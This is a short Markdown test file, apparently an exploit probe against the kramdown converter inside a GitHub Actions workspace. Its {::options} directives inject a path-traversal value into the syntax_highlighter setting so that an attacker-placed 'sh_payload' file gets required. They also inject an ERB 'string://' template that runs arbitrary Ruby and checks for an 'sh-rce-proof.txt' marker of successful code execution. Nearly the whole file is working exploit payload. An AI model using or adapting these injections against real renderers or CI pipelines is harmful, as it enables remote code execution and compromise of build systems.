---
---

# Test 27: Diagnostic - trace syntax_highlighter resolution

{::options syntax_highlighter="../../../../../../../../../github/workspace/sh_payload" /}

{::options template="string://<%= r=''; r=r+'SH_OPT='+@converter.options[:syntax_highlighter].to_s+\"\\n\"; r=r+'SH_CLASS='+@converter.options[:syntax_highlighter].class.to_s+\"\\n\"; begin; name=@converter.options[:syntax_highlighter].to_s; r=r+'NAME='+name+\"\\n\"; cname='SyntaxHighlighter'+name.split('_').map(&:capitalize).join; r=r+'CONST_NAME='+cname+\"\\n\"; begin; c=Kramdown::Converter.const_get(cname); r=r+'CONST_GET='+c.to_s+\"\\n\"; rescue NameError => e; r=r+'CONST_ERR='+e.message[0..80]+\"\\n\"; end; path='kramdown/converter/syntax_highlighter/'+name; r=r+'REQ_PATH='+path+\"\\n\"; begin; require path; r=r+'REQUIRE=SUCCESS\\n'; rescue LoadError => e; r=r+'REQ_ERR='+e.message[0..120]+\"\\n\"; rescue => e; r=r+'REQ_OTHER='+e.class.to_s+':'+e.message[0..80]+\"\\n\"; end; rescue => e; r=r+'DIAG_ERR='+e.class.to_s+':'+e.message[0..80]+\"\\n\"; end; begin; r=r+'SH_PROOF='+File.exist?('/github/workspace/sh-rce-proof.txt').to_s+\"\\n\"; rescue; end; r %>" /}

placeholder
